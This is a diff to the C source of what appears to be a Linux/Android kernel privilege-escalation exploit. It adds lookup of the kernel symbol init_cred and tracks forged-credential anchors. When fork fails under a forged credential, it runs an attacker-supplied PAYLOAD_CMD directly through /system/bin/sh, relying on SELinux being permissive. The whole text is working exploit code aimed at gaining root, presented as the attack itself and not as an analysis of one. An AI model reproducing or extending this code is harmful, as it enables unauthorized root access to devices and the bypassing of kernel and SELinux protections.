@@ -138,6 +138,7 @@ static unsigned long long g_text_runtime, g_tp_runtime, g_selinux_runtime;
 static unsigned long long g_tp_link, g_selinux_link;
 static unsigned long long g_root_user_link, g_init_user_ns_link;
 static unsigned long long g_init_ucounts_link, g_init_groups_link;
+static unsigned long long g_init_cred_link;
 static int g_rel_mode;
 static unsigned long long g_slide;
 static unsigned long long g_rel_abs;
@@ -2264,7 +2265,27 @@ static int wait_child_main(const char *mode)
         close(4);
         logf("[fake] child uid=%d euid=%d; forking worker\n",
              rep.uid, rep.euid);
+        errno = 0;
         w = fork();
+        logf("[fake] worker fork w=%d errno=%d\n", (int)w, errno);
+        if (w < 0)
+        {
+            /* copy_process can fail on a forged cred (ucounts/RLIMIT_NPROC
+             * accounting).  Fall through to exec the payload directly: with
+             * SELinux permissive the exec still normalizes the cred. */
+            const char *pc = getenv("PAYLOAD_CMD");
+
+            if (pc && *pc)
+            {
+                char *const pv[] = {(char *)"sh", (char *)"-c", (char *)pc,
+                                    NULL};
+
+                logf("[fake] fork failed; exec payload directly\n");
+                execve("/system/bin/sh", pv, envp);
+                logf("[-] direct payload exec failed errno=%d\n", errno);
+            }
+            _exit(0x40 | fl | ef);
+        }
         if (w == 0)
         {
             if (!strcmp(mode, "fullshell"))
@@ -2516,6 +2537,14 @@ static int read_syms_file(const char *path)
             if (!g_init_groups_link)
             {
                 g_init_groups_link = v;
+                n++;
+            }
+        }
+        else if (!strcmp(name, "init_cred"))
+        {
+            if (!g_init_cred_link)
+            {
+                g_init_cred_link = v;
                 n++;
             }
         }
@@ -3006,6 +3035,8 @@ int main(int argc, char **argv)
             {
                 g_tp_link = tab->link[IC_ANCHOR_N - 4];
                 g_selinux_link = tab->link[IC_ANCHOR_N - 3];
+                if (!g_init_cred_link)
+                    g_init_cred_link = tab->link[IC_ANCHOR_N - 1];
             }
         }
         if (tab && (getenv("IC_FORCE_ANCHORS") ||
@@ -3374,7 +3405,6 @@ int main(int argc, char **argv)
                     park_forever("fake euid fix failed");
             }
         }
-
     }
     logf("[+] cred writes landed, waking child\n");
 
